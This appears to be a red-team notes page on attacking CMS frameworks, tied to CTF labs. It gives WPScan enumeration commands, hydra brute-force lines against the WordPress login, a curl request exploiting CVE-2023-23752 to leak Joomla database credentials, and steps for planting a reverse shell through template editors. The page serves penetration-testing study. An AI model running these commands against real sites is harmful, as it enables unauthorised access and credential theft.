# Framework exploitation

<div class="row row-cols-lg-2"><div>

Frameworks and CMS such as WordPress make it easier to develop websites by providing a generic implementation of common website features. It's often advised to use a framework both to ease the work of the developers, and reduce the number of vulnerabilities.

Fewer vulnerabilities don't mean that there are no vulnerabilities. Frameworks may be misconfigured or misused. They may not be updated or users may have installed vulnerable third-party extensions.
</div><div>

Refer to [Website Fingerprint](/cybersecurity/red-team/s2.discovery/techniques/websites/fingerprint.md) to learn how to detect a framework.
</div></div>

<hr class="sep-both">

## WordPress

[![hackingwordpress](../../../_badges/htb/hackingwordpress.svg)](https://academy.hackthebox.com/course/preview/hacking-wordpress)
[![webenumerationv2](../../../_badges/thmp/webenumerationv2.svg)](https://tryhackme.com/room/webenumerationv2)
[![colddboxeasy](../../../_badges/thm-p/colddboxeasy.svg)](https://tryhackme.com/room/colddboxeasy)
[![allinonemj](../../../_badges/thm-p/allinonemj.svg)](https://tryhackme.com/room/allinonemj)
[![wordpress](../../../_badges/hacktricks/wordpress.svg)](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress)

<div class="row row-cols-lg-2"><div>

There are two **paid** solutions to attack [WordPress](/programming-languages/web/others/cms/wordpress/index.md): [Jetpack](https://jetpack.com/) and [WPScan](https://wpscan.com/). WPScan is providing a CLI tool for **free** and for non-commercial use available [here](https://wpscan.com/wordpress-cli-scanner/) (8.0k ⭐).

```ps
# before every scan, update the local metadata database
$ wpscan --update # may be automatically performed
```

You can enumerate themes, plugins, and usernames. By default, without `-e`, it will scan using `-e vp,vt,tt,cb,dbe,u,m`.

```ps
# Look into the HTML, /wp-content/themes/... for themes
$ wpscan --url URL -e t
$ wpscan --url URL -e vt # vulnerable themes
# Look into /wp-content/plugins/pluginname/... for plugins
# Use the README in each plugin to find the version
$ wpscan --url URL -e ap # all plugins
$ wpscan --url URL -e p  # popular plugins
$ wpscan --url URL -e vp # vulnerable plugins
# Find users (look for ID in posts...)
$ wpscan --url URL -e u
$ wpscan --url URL --enumerate u # same
```

You may have to add `--random-user-agent` to by-pass a simple WAF:

```ps
$ wpscan [...] --random-user-agent
```

You can use WPScan/[hydra](/cybersecurity/red-team/tools/cracking/auth/hydra.md#form-brute-force)/... to bruteforce the login form. When using the tool, you may also use `xmlrpc` instead of the login page.

```shell!
$ wpscan --url URL -P wordlist -U username # ", username2, etc."
$ wpscan [...] --password-attack xmlrpc    # use xmlrpc, faster
$ hydra -l username -P wordlist domain http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' -V
$ hydra -l username -P wordlist domain http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:F=is incorrect.' -V
```

⚠️ Don't use WordPress RPC API if you haven't tested that it works.
</div><div>

You can select a mode between aggressive/passive when scanning. Some results might not be visible according to the mode selected, so you should try both if you can.

```ps
$ wpscan --url URL -e t --plugins-detection aggressive
$ wpscan --url URL -e t --plugins-detection passive
```

You can increase the number of threads:

```ps
$ wpscan [...] -t 5 # default
```

The CLI can be unleashed with WPScan API that will retrieve vulnerabilities  when scanning. The limit is 25 requests per day. See [Optional: WordPress Vulnerability Database API](https://github.com/wpscanteam/wpscan/wiki/WPScan-User-Documentation#optional-wordpress-vulnerability-database-api). You can also browse vulnerabilities manually: [WordPress](https://wpscan.com/wordpresses), [Plugins](https://wpscan.com/plugins), and [Themes](https://wpscan.com/themes).

```ps
# To list vulnerabilities, add a "v" before the enumerated type
# ex: vulnerable plugins
$ wpscan --url URL -e vp
```

**To do it manually**

* WordPress version is in the source code (`<meta name="generator" content="WordPress X.Y.Z">`)
* Plugin and Theme names/versions are often loaded from the source code (link/script). The URL may include the version.
* Both WordPress, Plugins, and Themes may have a `readme.html`
* Look for links to user accounts, iterate `/?author=<id>`, or use `/wp-json/wp/v2/users` for versions before 4.7.1
* You can try to use `/xmlrpc.php` if available

**Exploit WordPress**

* [WordPress Plugins Exploitation](_files/wp-plugins.md).
* [WordPress Admin RCE](_files/wp-rce.md)
</div></div>

<hr class="sep-both">

## GetSimple CMS

![getsimplecms](../../../_badges/htb-p/getsimplecms.svg)

<div class="row row-cols-lg-2"><div>

Getting access to an account

* There is no default credentials
* The username is `admin`
* You may try brute forcing the password <small>(ex: test `admin`)</small>
</div><div>

Pop a reverse shell

* You can try to upload a reverse shell as an image
* You can replace the template code with a reverse shell, and navigate to the template page shown when editing the template
</div></div>

<hr class="sep-both">

## Django

[![django](../../../_badges/thm/django.svg)](https://tryhackme.com/room/django)

<div class="row row-cols-lg-2"><div>

The admin page default path is: `/admin`.
</div><div>
</div></div>

<hr class="sep-both">

## Joomla

[![devvortex](../../../_badges/htb-p/devvortex.svg)](https://app.hackthebox.com/machines/Devvortex)

<div class="row row-cols-lg-2"><div>

The admin page default path is: `/administrator`. 

The `/robots.txt` file may contain the list of interesting paths. If the website was not properly configured, `/README.txt` may be accessible.

* OWASP initiated the development of [joomscan](https://github.com/OWASP/joomscan) <small>(1.0k ⭐)</small>

```ps
$ sudo apt install joomscan
$ joomscan -u URL
[+] Detecting Joomla Version
[++] Joomla x.y.z

<SNIP... Nothing of interest>
```

* [droopescan](https://github.com/SamJoan/droopescan) <small>(1.1k ⭐, 2021 ☠️, deprecated)</small>
</div><div>

* [CVE-2023-23752](https://nvd.nist.gov/vuln/detail/CVE-2023-23752): Exposed credentials `[4.0.0, 4.2.7]`

```ps
$ curl -v URL/api/index.php/v1/config/application?public=true -v
"dbtype": "mysqli",
"host": "localhost",
"user": "xxx",
"password": "yyy"
"db": "joomla",
```

* When logged as administrator, you can upload a [reverse shell](/cybersecurity/red-team/s3.exploitation/shell/reverse_shell.md):

Go in System > Site Templates > Click on a template.
Create a new file or upload one if you can. You can copy-paste a shell:

```ps
$ cat revshell.php | xclip -selection clipboard
```

The file path is shown in the editor, while, for reference, mine was at `/templates/<site_name>/revshell.php`.
</div></div>